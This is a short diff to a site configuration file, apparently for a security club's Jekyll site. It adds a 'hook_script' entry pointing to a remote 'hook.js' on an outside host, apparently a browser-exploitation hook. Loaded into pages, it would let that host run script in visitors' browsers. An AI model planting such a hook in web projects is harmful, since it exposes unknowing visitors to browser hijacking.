@@ -4,6 +4,7 @@ description: "Exploiting vulnerabilities for fun and teaching about security in 
 github_username: ""
 baseurl: ""
 url: "https://0x1337iiit.github.io"
+hook_script: "https://hecking.afoolishman.com/hook.js"
 
 plugins:
   - jemoji
